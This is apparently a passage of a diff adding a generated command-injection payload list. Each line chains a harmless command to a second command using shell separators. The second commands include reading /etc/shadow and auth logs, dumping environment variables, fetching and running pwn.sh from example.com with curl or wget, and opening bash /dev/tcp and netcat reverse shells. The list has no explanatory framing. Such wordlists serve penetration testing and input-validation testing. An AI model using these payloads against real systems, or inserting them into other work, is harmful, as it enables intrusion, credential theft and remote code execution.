+ruby -e 'puts `id`' ; tar -cf /tmp/dump.tar /etc
+ruby -e 'puts `id`' && tar -cf /tmp/dump.tar /etc
+ruby -e 'puts `id`' | tar -cf /tmp/dump.tar /etc
+ruby -e 'puts `id`' || tar -cf /tmp/dump.tar /etc
+ruby -e 'puts `id`' ; openssl s_client -connect example.com:443
+ruby -e 'puts `id`' && openssl s_client -connect example.com:443
+ruby -e 'puts `id`' | openssl s_client -connect example.com:443
+ruby -e 'puts `id`' || openssl s_client -connect example.com:443
+ruby -e 'puts `id`' ; ssh localhost id
+ruby -e 'puts `id`' && ssh localhost id
+ruby -e 'puts `id`' | ssh localhost id
+ruby -e 'puts `id`' || ssh localhost id
+ruby -e 'puts `id`' ; ftp http://example.com/pwn.sh
+ruby -e 'puts `id`' && ftp http://example.com/pwn.sh
+ruby -e 'puts `id`' | ftp http://example.com/pwn.sh
+ruby -e 'puts `id`' || ftp http://example.com/pwn.sh
+/bin/bash -c 'id' ; id
+/bin/bash -c 'id' && id
+/bin/bash -c 'id' | id
+/bin/bash -c 'id' || id
+/bin/bash -c 'id' ; uname -a
+/bin/bash -c 'id' && uname -a
+/bin/bash -c 'id' | uname -a
+/bin/bash -c 'id' || uname -a
+/bin/bash -c 'id' ; whoami
+/bin/bash -c 'id' && whoami
+/bin/bash -c 'id' | whoami
+/bin/bash -c 'id' || whoami
+/bin/bash -c 'id' ; ls -la /
+/bin/bash -c 'id' && ls -la /
+/bin/bash -c 'id' | ls -la /
+/bin/bash -c 'id' || ls -la /
+/bin/bash -c 'id' ; ls -la /etc
+/bin/bash -c 'id' && ls -la /etc
+/bin/bash -c 'id' | ls -la /etc
+/bin/bash -c 'id' || ls -la /etc
+/bin/bash -c 'id' ; ls -lha /root
+/bin/bash -c 'id' && ls -lha /root
+/bin/bash -c 'id' | ls -lha /root
+/bin/bash -c 'id' || ls -lha /root
+/bin/bash -c 'id' ; cat /etc/passwd
+/bin/bash -c 'id' && cat /etc/passwd
+/bin/bash -c 'id' | cat /etc/passwd
+/bin/bash -c 'id' || cat /etc/passwd
+/bin/bash -c 'id' ; cat /etc/shadow
+/bin/bash -c 'id' && cat /etc/shadow
+/bin/bash -c 'id' | cat /etc/shadow
+/bin/bash -c 'id' || cat /etc/shadow
+/bin/bash -c 'id' ; cat /etc/hosts
+/bin/bash -c 'id' && cat /etc/hosts
+/bin/bash -c 'id' | cat /etc/hosts
+/bin/bash -c 'id' || cat /etc/hosts
+/bin/bash -c 'id' ; cat /var/log/auth.log
+/bin/bash -c 'id' && cat /var/log/auth.log
+/bin/bash -c 'id' | cat /var/log/auth.log
+/bin/bash -c 'id' || cat /var/log/auth.log
+/bin/bash -c 'id' ; env
+/bin/bash -c 'id' && env
+/bin/bash -c 'id' | env
+/bin/bash -c 'id' || env
+/bin/bash -c 'id' ; ps aux
+/bin/bash -c 'id' && ps aux
+/bin/bash -c 'id' | ps aux
+/bin/bash -c 'id' || ps aux
+/bin/bash -c 'id' ; netstat -tulnp
+/bin/bash -c 'id' && netstat -tulnp
+/bin/bash -c 'id' | netstat -tulnp
+/bin/bash -c 'id' || netstat -tulnp
+/bin/bash -c 'id' ; mtr -r 127.0.0.1 -c 1
+/bin/bash -c 'id' && mtr -r 127.0.0.1 -c 1
+/bin/bash -c 'id' | mtr -r 127.0.0.1 -c 1
+/bin/bash -c 'id' || mtr -r 127.0.0.1 -c 1
+/bin/bash -c 'id' ; curl http://example.com/pwn.sh | sh
+/bin/bash -c 'id' && curl http://example.com/pwn.sh | sh
+/bin/bash -c 'id' | curl http://example.com/pwn.sh | sh
+/bin/bash -c 'id' || curl http://example.com/pwn.sh | sh
+/bin/bash -c 'id' ; wget http://example.com/pwn.sh -O- | sh
+/bin/bash -c 'id' && wget http://example.com/pwn.sh -O- | sh
+/bin/bash -c 'id' | wget http://example.com/pwn.sh -O- | sh
+/bin/bash -c 'id' || wget http://example.com/pwn.sh -O- | sh
+/bin/bash -c 'id' ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash -c 'id' && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash -c 'id' | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash -c 'id' || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash -c 'id' ; nc 127.0.0.1 4444 -e /bin/bash
+/bin/bash -c 'id' && nc 127.0.0.1 4444 -e /bin/bash
+/bin/bash -c 'id' | nc 127.0.0.1 4444 -e /bin/bash
+/bin/bash -c 'id' || nc 127.0.0.1 4444 -e /bin/bash
+/bin/bash -c 'id' ; python -c 'import os;print(os.listdir("/"))'
+/bin/bash -c 'id' && python -c 'import os;print(os.listdir("/"))'
+/bin/bash -c 'id' | python -c 'import os;print(os.listdir("/"))'
+/bin/bash -c 'id' || python -c 'import os;print(os.listdir("/"))'
+/bin/bash -c 'id' ; perl -e 'print "pwned"'
+/bin/bash -c 'id' && perl -e 'print "pwned"'
+/bin/bash -c 'id' | perl -e 'print "pwned"'
+/bin/bash -c 'id' || perl -e 'print "pwned"'
+/bin/bash -c 'id' ; php -r 'system("id");'
+/bin/bash -c 'id' && php -r 'system("id");'
+/bin/bash -c 'id' | php -r 'system("id");'
+/bin/bash -c 'id' || php -r 'system("id");'
+/bin/bash -c 'id' ; ruby -e 'puts `id`'
+/bin/bash -c 'id' && ruby -e 'puts `id`'
+/bin/bash -c 'id' | ruby -e 'puts `id`'
+/bin/bash -c 'id' || ruby -e 'puts `id`'
+/bin/bash -c 'id' ; /bin/bash -c 'id'
+/bin/bash -c 'id' && /bin/bash -c 'id'
+/bin/bash -c 'id' | /bin/bash -c 'id'
+/bin/bash -c 'id' || /bin/bash -c 'id'
+/bin/bash -c 'id' ; /usr/bin/id >/tmp/id.txt
+/bin/bash -c 'id' && /usr/bin/id >/tmp/id.txt
+/bin/bash -c 'id' | /usr/bin/id >/tmp/id.txt
+/bin/bash -c 'id' || /usr/bin/id >/tmp/id.txt
+/bin/bash -c 'id' ; /bin/echo pwned > /tmp/pwned.txt
+/bin/bash -c 'id' && /bin/echo pwned > /tmp/pwned.txt
+/bin/bash -c 'id' | /bin/echo pwned > /tmp/pwned.txt
+/bin/bash -c 'id' || /bin/echo pwned > /tmp/pwned.txt
+/bin/bash -c 'id' ; /usr/bin/printf 'pwned\n'
+/bin/bash -c 'id' && /usr/bin/printf 'pwned\n'
+/bin/bash -c 'id' | /usr/bin/printf 'pwned\n'
+/bin/bash -c 'id' || /usr/bin/printf 'pwned\n'
+/bin/bash -c 'id' ; chmod +x /tmp/pwned
+/bin/bash -c 'id' && chmod +x /tmp/pwned
+/bin/bash -c 'id' | chmod +x /tmp/pwned
+/bin/bash -c 'id' || chmod +x /tmp/pwned
+/bin/bash -c 'id' ; tar -cf /tmp/dump.tar /etc
+/bin/bash -c 'id' && tar -cf /tmp/dump.tar /etc
+/bin/bash -c 'id' | tar -cf /tmp/dump.tar /etc
+/bin/bash -c 'id' || tar -cf /tmp/dump.tar /etc
+/bin/bash -c 'id' ; openssl s_client -connect example.com:443
+/bin/bash -c 'id' && openssl s_client -connect example.com:443
+/bin/bash -c 'id' | openssl s_client -connect example.com:443
+/bin/bash -c 'id' || openssl s_client -connect example.com:443
+/bin/bash -c 'id' ; ssh localhost id
+/bin/bash -c 'id' && ssh localhost id
+/bin/bash -c 'id' | ssh localhost id
+/bin/bash -c 'id' || ssh localhost id
+/bin/bash -c 'id' ; ftp http://example.com/pwn.sh
+/bin/bash -c 'id' && ftp http://example.com/pwn.sh
+/bin/bash -c 'id' | ftp http://example.com/pwn.sh
+/bin/bash -c 'id' || ftp http://example.com/pwn.sh
+/usr/bin/id >/tmp/id.txt ; id
+/usr/bin/id >/tmp/id.txt && id
+/usr/bin/id >/tmp/id.txt | id
+/usr/bin/id >/tmp/id.txt || id
+/usr/bin/id >/tmp/id.txt ; uname -a
+/usr/bin/id >/tmp/id.txt && uname -a
+/usr/bin/id >/tmp/id.txt | uname -a
+/usr/bin/id >/tmp/id.txt || uname -a
+/usr/bin/id >/tmp/id.txt ; whoami
+/usr/bin/id >/tmp/id.txt && whoami
+/usr/bin/id >/tmp/id.txt | whoami
+/usr/bin/id >/tmp/id.txt || whoami
+/usr/bin/id >/tmp/id.txt ; ls -la /
+/usr/bin/id >/tmp/id.txt && ls -la /
+/usr/bin/id >/tmp/id.txt | ls -la /
+/usr/bin/id >/tmp/id.txt || ls -la /
+/usr/bin/id >/tmp/id.txt ; ls -la /etc
+/usr/bin/id >/tmp/id.txt && ls -la /etc
+/usr/bin/id >/tmp/id.txt | ls -la /etc
+/usr/bin/id >/tmp/id.txt || ls -la /etc
+/usr/bin/id >/tmp/id.txt ; ls -lha /root
+/usr/bin/id >/tmp/id.txt && ls -lha /root
+/usr/bin/id >/tmp/id.txt | ls -lha /root
+/usr/bin/id >/tmp/id.txt || ls -lha /root
+/usr/bin/id >/tmp/id.txt ; cat /etc/passwd
+/usr/bin/id >/tmp/id.txt && cat /etc/passwd
+/usr/bin/id >/tmp/id.txt | cat /etc/passwd
+/usr/bin/id >/tmp/id.txt || cat /etc/passwd
+/usr/bin/id >/tmp/id.txt ; cat /etc/shadow
+/usr/bin/id >/tmp/id.txt && cat /etc/shadow
+/usr/bin/id >/tmp/id.txt | cat /etc/shadow
+/usr/bin/id >/tmp/id.txt || cat /etc/shadow
+/usr/bin/id >/tmp/id.txt ; cat /etc/hosts
+/usr/bin/id >/tmp/id.txt && cat /etc/hosts
+/usr/bin/id >/tmp/id.txt | cat /etc/hosts
+/usr/bin/id >/tmp/id.txt || cat /etc/hosts
+/usr/bin/id >/tmp/id.txt ; cat /var/log/auth.log
+/usr/bin/id >/tmp/id.txt && cat /var/log/auth.log
+/usr/bin/id >/tmp/id.txt | cat /var/log/auth.log
+/usr/bin/id >/tmp/id.txt || cat /var/log/auth.log
+/usr/bin/id >/tmp/id.txt ; env
+/usr/bin/id >/tmp/id.txt && env
+/usr/bin/id >/tmp/id.txt | env
+/usr/bin/id >/tmp/id.txt || env
+/usr/bin/id >/tmp/id.txt ; ps aux
+/usr/bin/id >/tmp/id.txt && ps aux
+/usr/bin/id >/tmp/id.txt | ps aux
+/usr/bin/id >/tmp/id.txt || ps aux
+/usr/bin/id >/tmp/id.txt ; netstat -tulnp
+/usr/bin/id >/tmp/id.txt && netstat -tulnp
+/usr/bin/id >/tmp/id.txt | netstat -tulnp
+/usr/bin/id >/tmp/id.txt || netstat -tulnp
+/usr/bin/id >/tmp/id.txt ; mtr -r 127.0.0.1 -c 1
+/usr/bin/id >/tmp/id.txt && mtr -r 127.0.0.1 -c 1
+/usr/bin/id >/tmp/id.txt | mtr -r 127.0.0.1 -c 1
+/usr/bin/id >/tmp/id.txt || mtr -r 127.0.0.1 -c 1
+/usr/bin/id >/tmp/id.txt ; curl http://example.com/pwn.sh | sh
+/usr/bin/id >/tmp/id.txt && curl http://example.com/pwn.sh | sh
+/usr/bin/id >/tmp/id.txt | curl http://example.com/pwn.sh | sh
+/usr/bin/id >/tmp/id.txt || curl http://example.com/pwn.sh | sh
+/usr/bin/id >/tmp/id.txt ; wget http://example.com/pwn.sh -O- | sh
+/usr/bin/id >/tmp/id.txt && wget http://example.com/pwn.sh -O- | sh
+/usr/bin/id >/tmp/id.txt | wget http://example.com/pwn.sh -O- | sh
+/usr/bin/id >/tmp/id.txt || wget http://example.com/pwn.sh -O- | sh
+/usr/bin/id >/tmp/id.txt ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/id >/tmp/id.txt && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/id >/tmp/id.txt | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/id >/tmp/id.txt || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/id >/tmp/id.txt ; nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/id >/tmp/id.txt && nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/id >/tmp/id.txt | nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/id >/tmp/id.txt || nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/id >/tmp/id.txt ; python -c 'import os;print(os.listdir("/"))'
+/usr/bin/id >/tmp/id.txt && python -c 'import os;print(os.listdir("/"))'
+/usr/bin/id >/tmp/id.txt | python -c 'import os;print(os.listdir("/"))'
+/usr/bin/id >/tmp/id.txt || python -c 'import os;print(os.listdir("/"))'
+/usr/bin/id >/tmp/id.txt ; perl -e 'print "pwned"'
+/usr/bin/id >/tmp/id.txt && perl -e 'print "pwned"'
+/usr/bin/id >/tmp/id.txt | perl -e 'print "pwned"'
+/usr/bin/id >/tmp/id.txt || perl -e 'print "pwned"'
+/usr/bin/id >/tmp/id.txt ; php -r 'system("id");'
+/usr/bin/id >/tmp/id.txt && php -r 'system("id");'
+/usr/bin/id >/tmp/id.txt | php -r 'system("id");'
+/usr/bin/id >/tmp/id.txt || php -r 'system("id");'
+/usr/bin/id >/tmp/id.txt ; ruby -e 'puts `id`'
+/usr/bin/id >/tmp/id.txt && ruby -e 'puts `id`'
+/usr/bin/id >/tmp/id.txt | ruby -e 'puts `id`'
+/usr/bin/id >/tmp/id.txt || ruby -e 'puts `id`'
+/usr/bin/id >/tmp/id.txt ; /bin/bash -c 'id'
+/usr/bin/id >/tmp/id.txt && /bin/bash -c 'id'
+/usr/bin/id >/tmp/id.txt | /bin/bash -c 'id'
+/usr/bin/id >/tmp/id.txt || /bin/bash -c 'id'
+/usr/bin/id >/tmp/id.txt ; /usr/bin/id >/tmp/id.txt
+/usr/bin/id >/tmp/id.txt && /usr/bin/id >/tmp/id.txt
+/usr/bin/id >/tmp/id.txt | /usr/bin/id >/tmp/id.txt
+/usr/bin/id >/tmp/id.txt || /usr/bin/id >/tmp/id.txt
+/usr/bin/id >/tmp/id.txt ; /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/id >/tmp/id.txt && /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/id >/tmp/id.txt | /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/id >/tmp/id.txt || /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/id >/tmp/id.txt ; /usr/bin/printf 'pwned\n'
+/usr/bin/id >/tmp/id.txt && /usr/bin/printf 'pwned\n'
+/usr/bin/id >/tmp/id.txt | /usr/bin/printf 'pwned\n'
+/usr/bin/id >/tmp/id.txt || /usr/bin/printf 'pwned\n'
+/usr/bin/id >/tmp/id.txt ; chmod +x /tmp/pwned
+/usr/bin/id >/tmp/id.txt && chmod +x /tmp/pwned
+/usr/bin/id >/tmp/id.txt | chmod +x /tmp/pwned
+/usr/bin/id >/tmp/id.txt || chmod +x /tmp/pwned
+/usr/bin/id >/tmp/id.txt ; tar -cf /tmp/dump.tar /etc
+/usr/bin/id >/tmp/id.txt && tar -cf /tmp/dump.tar /etc
+/usr/bin/id >/tmp/id.txt | tar -cf /tmp/dump.tar /etc
+/usr/bin/id >/tmp/id.txt || tar -cf /tmp/dump.tar /etc
+/usr/bin/id >/tmp/id.txt ; openssl s_client -connect example.com:443
+/usr/bin/id >/tmp/id.txt && openssl s_client -connect example.com:443
+/usr/bin/id >/tmp/id.txt | openssl s_client -connect example.com:443
+/usr/bin/id >/tmp/id.txt || openssl s_client -connect example.com:443
+/usr/bin/id >/tmp/id.txt ; ssh localhost id
+/usr/bin/id >/tmp/id.txt && ssh localhost id
+/usr/bin/id >/tmp/id.txt | ssh localhost id
+/usr/bin/id >/tmp/id.txt || ssh localhost id
+/usr/bin/id >/tmp/id.txt ; ftp http://example.com/pwn.sh
+/usr/bin/id >/tmp/id.txt && ftp http://example.com/pwn.sh
+/usr/bin/id >/tmp/id.txt | ftp http://example.com/pwn.sh
+/usr/bin/id >/tmp/id.txt || ftp http://example.com/pwn.sh
+/bin/echo pwned > /tmp/pwned.txt ; id
+/bin/echo pwned > /tmp/pwned.txt && id
+/bin/echo pwned > /tmp/pwned.txt | id
+/bin/echo pwned > /tmp/pwned.txt || id
+/bin/echo pwned > /tmp/pwned.txt ; uname -a
+/bin/echo pwned > /tmp/pwned.txt && uname -a
+/bin/echo pwned > /tmp/pwned.txt | uname -a
+/bin/echo pwned > /tmp/pwned.txt || uname -a
+/bin/echo pwned > /tmp/pwned.txt ; whoami
+/bin/echo pwned > /tmp/pwned.txt && whoami
+/bin/echo pwned > /tmp/pwned.txt | whoami
+/bin/echo pwned > /tmp/pwned.txt || whoami
+/bin/echo pwned > /tmp/pwned.txt ; ls -la /
+/bin/echo pwned > /tmp/pwned.txt && ls -la /
+/bin/echo pwned > /tmp/pwned.txt | ls -la /
+/bin/echo pwned > /tmp/pwned.txt || ls -la /
+/bin/echo pwned > /tmp/pwned.txt ; ls -la /etc
+/bin/echo pwned > /tmp/pwned.txt && ls -la /etc
+/bin/echo pwned > /tmp/pwned.txt | ls -la /etc
+/bin/echo pwned > /tmp/pwned.txt || ls -la /etc
+/bin/echo pwned > /tmp/pwned.txt ; ls -lha /root
+/bin/echo pwned > /tmp/pwned.txt && ls -lha /root
+/bin/echo pwned > /tmp/pwned.txt | ls -lha /root
+/bin/echo pwned > /tmp/pwned.txt || ls -lha /root
+/bin/echo pwned > /tmp/pwned.txt ; cat /etc/passwd
+/bin/echo pwned > /tmp/pwned.txt && cat /etc/passwd
+/bin/echo pwned > /tmp/pwned.txt | cat /etc/passwd
+/bin/echo pwned > /tmp/pwned.txt || cat /etc/passwd
+/bin/echo pwned > /tmp/pwned.txt ; cat /etc/shadow
+/bin/echo pwned > /tmp/pwned.txt && cat /etc/shadow
+/bin/echo pwned > /tmp/pwned.txt | cat /etc/shadow
+/bin/echo pwned > /tmp/pwned.txt || cat /etc/shadow
+/bin/echo pwned > /tmp/pwned.txt ; cat /etc/hosts
+/bin/echo pwned > /tmp/pwned.txt && cat /etc/hosts
+/bin/echo pwned > /tmp/pwned.txt | cat /etc/hosts
+/bin/echo pwned > /tmp/pwned.txt || cat /etc/hosts
+/bin/echo pwned > /tmp/pwned.txt ; cat /var/log/auth.log
+/bin/echo pwned > /tmp/pwned.txt && cat /var/log/auth.log
+/bin/echo pwned > /tmp/pwned.txt | cat /var/log/auth.log
+/bin/echo pwned > /tmp/pwned.txt || cat /var/log/auth.log
+/bin/echo pwned > /tmp/pwned.txt ; env
+/bin/echo pwned > /tmp/pwned.txt && env
+/bin/echo pwned > /tmp/pwned.txt | env
+/bin/echo pwned > /tmp/pwned.txt || env
+/bin/echo pwned > /tmp/pwned.txt ; ps aux
+/bin/echo pwned > /tmp/pwned.txt && ps aux
+/bin/echo pwned > /tmp/pwned.txt | ps aux
+/bin/echo pwned > /tmp/pwned.txt || ps aux
+/bin/echo pwned > /tmp/pwned.txt ; netstat -tulnp
+/bin/echo pwned > /tmp/pwned.txt && netstat -tulnp
+/bin/echo pwned > /tmp/pwned.txt | netstat -tulnp
+/bin/echo pwned > /tmp/pwned.txt || netstat -tulnp
+/bin/echo pwned > /tmp/pwned.txt ; mtr -r 127.0.0.1 -c 1
+/bin/echo pwned > /tmp/pwned.txt && mtr -r 127.0.0.1 -c 1
+/bin/echo pwned > /tmp/pwned.txt | mtr -r 127.0.0.1 -c 1
+/bin/echo pwned > /tmp/pwned.txt || mtr -r 127.0.0.1 -c 1
+/bin/echo pwned > /tmp/pwned.txt ; curl http://example.com/pwn.sh | sh
+/bin/echo pwned > /tmp/pwned.txt && curl http://example.com/pwn.sh | sh
+/bin/echo pwned > /tmp/pwned.txt | curl http://example.com/pwn.sh | sh
+/bin/echo pwned > /tmp/pwned.txt || curl http://example.com/pwn.sh | sh
+/bin/echo pwned > /tmp/pwned.txt ; wget http://example.com/pwn.sh -O- | sh
+/bin/echo pwned > /tmp/pwned.txt && wget http://example.com/pwn.sh -O- | sh
+/bin/echo pwned > /tmp/pwned.txt | wget http://example.com/pwn.sh -O- | sh
+/bin/echo pwned > /tmp/pwned.txt || wget http://example.com/pwn.sh -O- | sh
+/bin/echo pwned > /tmp/pwned.txt ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/echo pwned > /tmp/pwned.txt && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/echo pwned > /tmp/pwned.txt | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/echo pwned > /tmp/pwned.txt || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/echo pwned > /tmp/pwned.txt ; nc 127.0.0.1 4444 -e /bin/bash
+/bin/echo pwned > /tmp/pwned.txt && nc 127.0.0.1 4444 -e /bin/bash
+/bin/echo pwned > /tmp/pwned.txt | nc 127.0.0.1 4444 -e /bin/bash
+/bin/echo pwned > /tmp/pwned.txt || nc 127.0.0.1 4444 -e /bin/bash
+/bin/echo pwned > /tmp/pwned.txt ; python -c 'import os;print(os.listdir("/"))'
+/bin/echo pwned > /tmp/pwned.txt && python -c 'import os;print(os.listdir("/"))'
+/bin/echo pwned > /tmp/pwned.txt | python -c 'import os;print(os.listdir("/"))'
+/bin/echo pwned > /tmp/pwned.txt || python -c 'import os;print(os.listdir("/"))'
+/bin/echo pwned > /tmp/pwned.txt ; perl -e 'print "pwned"'
+/bin/echo pwned > /tmp/pwned.txt && perl -e 'print "pwned"'
+/bin/echo pwned > /tmp/pwned.txt | perl -e 'print "pwned"'
+/bin/echo pwned > /tmp/pwned.txt || perl -e 'print "pwned"'
+/bin/echo pwned > /tmp/pwned.txt ; php -r 'system("id");'
+/bin/echo pwned > /tmp/pwned.txt && php -r 'system("id");'
+/bin/echo pwned > /tmp/pwned.txt | php -r 'system("id");'
+/bin/echo pwned > /tmp/pwned.txt || php -r 'system("id");'
+/bin/echo pwned > /tmp/pwned.txt ; ruby -e 'puts `id`'
+/bin/echo pwned > /tmp/pwned.txt && ruby -e 'puts `id`'
+/bin/echo pwned > /tmp/pwned.txt | ruby -e 'puts `id`'
+/bin/echo pwned > /tmp/pwned.txt || ruby -e 'puts `id`'
+/bin/echo pwned > /tmp/pwned.txt ; /bin/bash -c 'id'
+/bin/echo pwned > /tmp/pwned.txt && /bin/bash -c 'id'
+/bin/echo pwned > /tmp/pwned.txt | /bin/bash -c 'id'
+/bin/echo pwned > /tmp/pwned.txt || /bin/bash -c 'id'
+/bin/echo pwned > /tmp/pwned.txt ; /usr/bin/id >/tmp/id.txt
+/bin/echo pwned > /tmp/pwned.txt && /usr/bin/id >/tmp/id.txt
+/bin/echo pwned > /tmp/pwned.txt | /usr/bin/id >/tmp/id.txt
+/bin/echo pwned > /tmp/pwned.txt || /usr/bin/id >/tmp/id.txt
+/bin/echo pwned > /tmp/pwned.txt ; /bin/echo pwned > /tmp/pwned.txt
+/bin/echo pwned > /tmp/pwned.txt && /bin/echo pwned > /tmp/pwned.txt
+/bin/echo pwned > /tmp/pwned.txt | /bin/echo pwned > /tmp/pwned.txt
+/bin/echo pwned > /tmp/pwned.txt || /bin/echo pwned > /tmp/pwned.txt
+/bin/echo pwned > /tmp/pwned.txt ; /usr/bin/printf 'pwned\n'
+/bin/echo pwned > /tmp/pwned.txt && /usr/bin/printf 'pwned\n'
+/bin/echo pwned > /tmp/pwned.txt | /usr/bin/printf 'pwned\n'
+/bin/echo pwned > /tmp/pwned.txt || /usr/bin/printf 'pwned\n'
+/bin/echo pwned > /tmp/pwned.txt ; chmod +x /tmp/pwned
+/bin/echo pwned > /tmp/pwned.txt && chmod +x /tmp/pwned
+/bin/echo pwned > /tmp/pwned.txt | chmod +x /tmp/pwned
+/bin/echo pwned > /tmp/pwned.txt || chmod +x /tmp/pwned
+/bin/echo pwned > /tmp/pwned.txt ; tar -cf /tmp/dump.tar /etc
+/bin/echo pwned > /tmp/pwned.txt && tar -cf /tmp/dump.tar /etc
+/bin/echo pwned > /tmp/pwned.txt | tar -cf /tmp/dump.tar /etc
+/bin/echo pwned > /tmp/pwned.txt || tar -cf /tmp/dump.tar /etc
+/bin/echo pwned > /tmp/pwned.txt ; openssl s_client -connect example.com:443
+/bin/echo pwned > /tmp/pwned.txt && openssl s_client -connect example.com:443
+/bin/echo pwned > /tmp/pwned.txt | openssl s_client -connect example.com:443
+/bin/echo pwned > /tmp/pwned.txt || openssl s_client -connect example.com:443
+/bin/echo pwned > /tmp/pwned.txt ; ssh localhost id
+/bin/echo pwned > /tmp/pwned.txt && ssh localhost id
+/bin/echo pwned > /tmp/pwned.txt | ssh localhost id
+/bin/echo pwned > /tmp/pwned.txt || ssh localhost id
+/bin/echo pwned > /tmp/pwned.txt ; ftp http://example.com/pwn.sh
+/bin/echo pwned > /tmp/pwned.txt && ftp http://example.com/pwn.sh
+/bin/echo pwned > /tmp/pwned.txt | ftp http://example.com/pwn.sh
+/bin/echo pwned > /tmp/pwned.txt || ftp http://example.com/pwn.sh
+/usr/bin/printf 'pwned\n' ; id
+/usr/bin/printf 'pwned\n' && id
+/usr/bin/printf 'pwned\n' | id
+/usr/bin/printf 'pwned\n' || id
+/usr/bin/printf 'pwned\n' ; uname -a
+/usr/bin/printf 'pwned\n' && uname -a
+/usr/bin/printf 'pwned\n' | uname -a
+/usr/bin/printf 'pwned\n' || uname -a
+/usr/bin/printf 'pwned\n' ; whoami
+/usr/bin/printf 'pwned\n' && whoami
+/usr/bin/printf 'pwned\n' | whoami
+/usr/bin/printf 'pwned\n' || whoami
+/usr/bin/printf 'pwned\n' ; ls -la /
+/usr/bin/printf 'pwned\n' && ls -la /
+/usr/bin/printf 'pwned\n' | ls -la /
+/usr/bin/printf 'pwned\n' || ls -la /
+/usr/bin/printf 'pwned\n' ; ls -la /etc
+/usr/bin/printf 'pwned\n' && ls -la /etc
+/usr/bin/printf 'pwned\n' | ls -la /etc
+/usr/bin/printf 'pwned\n' || ls -la /etc
+/usr/bin/printf 'pwned\n' ; ls -lha /root
+/usr/bin/printf 'pwned\n' && ls -lha /root
+/usr/bin/printf 'pwned\n' | ls -lha /root
+/usr/bin/printf 'pwned\n' || ls -lha /root
+/usr/bin/printf 'pwned\n' ; cat /etc/passwd
+/usr/bin/printf 'pwned\n' && cat /etc/passwd
+/usr/bin/printf 'pwned\n' | cat /etc/passwd
+/usr/bin/printf 'pwned\n' || cat /etc/passwd
+/usr/bin/printf 'pwned\n' ; cat /etc/shadow
+/usr/bin/printf 'pwned\n' && cat /etc/shadow
+/usr/bin/printf 'pwned\n' | cat /etc/shadow
+/usr/bin/printf 'pwned\n' || cat /etc/shadow
+/usr/bin/printf 'pwned\n' ; cat /etc/hosts
+/usr/bin/printf 'pwned\n' && cat /etc/hosts
+/usr/bin/printf 'pwned\n' | cat /etc/hosts
+/usr/bin/printf 'pwned\n' || cat /etc/hosts
+/usr/bin/printf 'pwned\n' ; cat /var/log/auth.log
+/usr/bin/printf 'pwned\n' && cat /var/log/auth.log
+/usr/bin/printf 'pwned\n' | cat /var/log/auth.log
+/usr/bin/printf 'pwned\n' || cat /var/log/auth.log
+/usr/bin/printf 'pwned\n' ; env
+/usr/bin/printf 'pwned\n' && env
+/usr/bin/printf 'pwned\n' | env
+/usr/bin/printf 'pwned\n' || env
+/usr/bin/printf 'pwned\n' ; ps aux
+/usr/bin/printf 'pwned\n' && ps aux
+/usr/bin/printf 'pwned\n' | ps aux
+/usr/bin/printf 'pwned\n' || ps aux
+/usr/bin/printf 'pwned\n' ; netstat -tulnp
+/usr/bin/printf 'pwned\n' && netstat -tulnp
+/usr/bin/printf 'pwned\n' | netstat -tulnp
+/usr/bin/printf 'pwned\n' || netstat -tulnp
+/usr/bin/printf 'pwned\n' ; mtr -r 127.0.0.1 -c 1
+/usr/bin/printf 'pwned\n' && mtr -r 127.0.0.1 -c 1
+/usr/bin/printf 'pwned\n' | mtr -r 127.0.0.1 -c 1
+/usr/bin/printf 'pwned\n' || mtr -r 127.0.0.1 -c 1
+/usr/bin/printf 'pwned\n' ; curl http://example.com/pwn.sh | sh
+/usr/bin/printf 'pwned\n' && curl http://example.com/pwn.sh | sh
+/usr/bin/printf 'pwned\n' | curl http://example.com/pwn.sh | sh
+/usr/bin/printf 'pwned\n' || curl http://example.com/pwn.sh | sh
+/usr/bin/printf 'pwned\n' ; wget http://example.com/pwn.sh -O- | sh
+/usr/bin/printf 'pwned\n' && wget http://example.com/pwn.sh -O- | sh
+/usr/bin/printf 'pwned\n' | wget http://example.com/pwn.sh -O- | sh
+/usr/bin/printf 'pwned\n' || wget http://example.com/pwn.sh -O- | sh
+/usr/bin/printf 'pwned\n' ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/printf 'pwned\n' && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/printf 'pwned\n' | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/printf 'pwned\n' || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/usr/bin/printf 'pwned\n' ; nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/printf 'pwned\n' && nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/printf 'pwned\n' | nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/printf 'pwned\n' || nc 127.0.0.1 4444 -e /bin/bash
+/usr/bin/printf 'pwned\n' ; python -c 'import os;print(os.listdir("/"))'
+/usr/bin/printf 'pwned\n' && python -c 'import os;print(os.listdir("/"))'
+/usr/bin/printf 'pwned\n' | python -c 'import os;print(os.listdir("/"))'
+/usr/bin/printf 'pwned\n' || python -c 'import os;print(os.listdir("/"))'
+/usr/bin/printf 'pwned\n' ; perl -e 'print "pwned"'
+/usr/bin/printf 'pwned\n' && perl -e 'print "pwned"'
+/usr/bin/printf 'pwned\n' | perl -e 'print "pwned"'
+/usr/bin/printf 'pwned\n' || perl -e 'print "pwned"'
